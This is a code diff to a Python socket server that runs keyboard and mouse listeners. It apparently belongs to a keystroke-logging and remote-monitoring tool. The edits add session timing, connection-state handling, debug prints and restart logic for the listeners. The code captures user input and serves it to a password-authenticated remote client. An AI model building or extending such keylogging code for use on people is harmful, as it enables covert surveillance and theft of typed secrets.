@@ -101,6 +101,7 @@ class Server:
         self.count = 0
         self.log_keyboard = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
         self.log_mouse = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
+        self.start_time = False
         
     def connect(self):
         while True:
@@ -115,6 +116,7 @@ class Server:
                     if not self.have_pass:
                         self.live = True
                         self.accept_pass = True
+                        self.start_time = time()
                         self.start_sync()
                         self.start_keylog()
                 except:
@@ -133,6 +135,7 @@ class Server:
             self.client_socket.sendall(packet)
            
         except:
+            self.connected = False
             self.disconnect()
             self.wait_connect=False
             sleep(5)
@@ -231,13 +234,14 @@ class Server:
                     sleep(1)
                     
             else:
-                try:
-                    if skclient_socket:
-                        skclient_socket.close()
-                except:
-                    pass
-                finally:
-                    skclient_socket = None
+                if not self.connected:
+                    try:
+                        if skclient_socket:
+                            skclient_socket.close()
+                    except:
+                        pass
+                    finally:
+                        skclient_socket = None
                 if not self.wait_connect:
                     return
                 sleep(1)
@@ -287,8 +291,10 @@ class Server:
 
     def handle_pass(self, password):
         if self.checkpass(password):
+            print('Accept pass!')
             self.accept_pass = True
             self.live = True
+            self.start_time = time()
             mes = {
                 'type': 'pass',
                 'status': True
@@ -297,6 +303,7 @@ class Server:
             self.start_keylog()
             self._send(mes)
         else:
+            print('Wrong pass!')
             mes = {
                 'type': 'pass',
                 'status': False
@@ -321,11 +328,13 @@ class Server:
             self.live = False
             self.accept_pass = False
         finally:
+            self.start_time = False
             self.stop_sync()
             self.stop_keylog()
             if self.client_socket is not None:
                 self.client_socket.close()
                 self.client_socket = None
+                
 
     def async_file(self):
         if not os.path.exists(self.path):
@@ -420,6 +429,8 @@ class Server:
     def stop_keylog(self):
         self.log_keyboard.stop()
         self.log_mouse.stop()
+        self.log_keyboard = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
+        self.log_mouse = mouse.Listener(on_click=self.on_click, on_scroll=self.on_scroll)
     
     def run(self):
         Thread(target=self.connect).start()
